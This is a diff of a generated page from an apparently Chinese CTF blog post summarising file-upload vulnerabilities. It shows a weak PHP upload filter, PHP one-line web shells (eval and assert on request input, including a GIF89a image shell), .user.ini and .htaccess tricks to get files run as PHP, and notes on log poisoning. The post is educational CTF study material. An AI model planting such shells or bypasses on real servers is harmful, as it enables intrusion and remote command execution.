@@ -16,21 +16,24 @@
   <meta name="author" content="mowit">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738&lt;?php     header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);    $filename &#x3D; $_FILES[&amp;#x27;file&amp;#x27;][&amp;#x27;name&amp;#x27;];">
+    <meta name="description" content="文件上传漏洞总结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mowit">
-<meta property="og:url" content="https://mowit07.github.io/2024/05/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:title" content="文件上传漏洞总结">
+<meta property="og:url" content="https://mowit07.github.io/2022/12/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="Mowit">
-<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738&lt;?php     header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);    $filename &#x3D; $_FILES[&amp;#x27;file&amp;#x27;][&amp;#x27;name&amp;#x27;];">
+<meta property="og:description" content="文件上传漏洞总结">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-05-10T07:13:13.058Z">
-<meta property="article:modified_time" content="2024-05-11T08:21:36.447Z">
+<meta property="og:image" content="https://mowit07.github.io/mdimg/CTFtrain/m7.png">
+<meta property="article:published_time" content="2022-12-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-05-11T09:18:11.747Z">
 <meta property="article:author" content="mowit">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mowit07.github.io/mdimg/CTFtrain/m7.png">
   
   
   
-  <title>Mowit</title>
+  <title>文件上传漏洞总结 - Mowit</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -219,13 +222,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/defaul.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/m7.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="文件上传漏洞总结"></span>
           
         </div>
 
@@ -241,8 +244,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-05-10 15:13" pubdate>
-          2024年5月10日 下午
+        <time datetime="2022-12-20 00:00" pubdate>
+          2022年12月20日 凌晨
         </time>
       </span>
     
@@ -253,7 +256,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1k 字
+          2.6k 字
         
       </span>
     
@@ -264,7 +267,7 @@
         
         
         
-          9 分钟
+          22 分钟
         
       </span>
     
@@ -309,23 +312,19 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">文件上传漏洞总结</h1>
             
             
               <div class="markdown-body">
                 
-                <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$error</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <span class="hljs-comment">//pathinfo — 返回文件路径的信息</span><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-comment">//文件&lt;=24</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span> &gt; <span class="hljs-number">24</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file zise&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字长度&lt;=9</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>)&gt;<span class="hljs-number">9</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件后缀&lt;=3</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ext_suffix</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//后缀过滤掉了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-variable">$ext_suffix</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字也过滤了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>),<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//满足以上则上传成功</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_name</span>, <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>    &#125;<br><br> <span class="hljs-meta">?&gt;</span><br>构造一个一句话的文本文件<br></code></pre></td></tr></table></figure>
-<?php eval($_POST['a']);
-
-对于php中的.usr.ini有如下解释：
-PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。
-我们在.usr.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容
-.user.ini中写入 auto_prepend_file=a.txt，然后再写入一个a.txt，里面加入<?php eval($_GET或POST['a']);?><p>用来执行命令。如果写POST一句话使用蚁剑可以连接上，但是提示没有权限。<br>上传之后就可以利用命令执行了，访问?a=print_r(scandir或glob(‘.’));可以发现一个文件名很长的文件，使用?a=highlight_file(‘xxx’)即可输出flag。</p>
+                <h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$error</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <span class="hljs-comment">//pathinfo — 返回文件路径的信息</span><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-comment">//文件&lt;=24</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span> &gt; <span class="hljs-number">24</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file zise&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字长度&lt;=9</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>)&gt;<span class="hljs-number">9</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件后缀&lt;=3</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ext_suffix</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//后缀过滤掉了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-variable">$ext_suffix</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字也过滤了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>),<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//满足以上则上传成功</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_name</span>, <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>    &#125;<br><br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>构造一个一句话的文本文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+<p>Nginx的.usr.ini文件上传漏洞<br>对于php中的.usr.ini有如下解释：<br>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。<br>我们在.usr.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容<br>.user.ini中写入 auto_prepend_file=a.txt，然后再写入一个a.txt，里面加入<?php eval($_GET或POST['a']);?>用来执行命令。如果写POST一句话使用蚁剑可以连接上，但是提示没有权限。<br>上传之后就可以利用命令执行了，访问?a=print_r(scandir或glob(‘.’));可以发现一个文件名很长的文件，使用?a=highlight_file(‘xxx’)即可输出flag。</p>
 <p>exif_imagetype()函数<br>函数功能是读取一个图像的第一个字节并检查其签名。 在一句话前面加个GIF89a进行绕过<br>那么现在的一句话如下，可以制作成图片马，但是需要解析成php</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">assert</span>($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p>正常想到的是.htaccess，但是这个服务器是nginx，而.htaccess是针对apache，htaccess 可以通过设置实现nginx文件解析配置，将.png 后缀的文件解析成 php。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">assert</span>($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p>而.htaccess是针对apache，htaccess 可以通过设置实现nginx文件解析配置，将.png 后缀的文件解析成 php。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x-httpd-php .jpg <br>//htaccess文件内容<br></code></pre></td></tr></table></figure>
-
 <p>所以nginx服务器使用的是 .user.ini  </p>
 <p>UA注入访问日志文件<br>首先需要开启服务器记录日志功能</p>
 <p>在不同的系统，存放日志文件地方和文件名不同<br>apache一般是/var/log/apache/access.log</p>
@@ -344,6 +343,41 @@ PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
+      
+    </div>
   
 </div>
 
@@ -353,8 +387,8 @@ PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>https://mowit07.github.io/2024/05/10/文件上传/</div>
+      <div>文件上传漏洞总结</div>
+      <div>https://mowit07.github.io/2022/12/20/文件上传/</div>
     </div>
     <div class="license-meta">
       
@@ -366,7 +400,7 @@ PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年5月10日</div>
+          <div>2022年12月20日</div>
         </div>
       
       
@@ -398,15 +432,15 @@ PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2022/12/22/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP伪协议">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP伪协议</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
-                    
-                      <a href="/2024/04/16/%5BSWPU%202019%5Deasyapp%E7%9A%84hook%E8%A7%A3%E6%B3%95/" title="SWPU2019 easyapp的hook解法">
-                        <span class="hidden-mobile">SWPU2019 easyapp的hook解法</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
                     
                   </article>
                 </div>
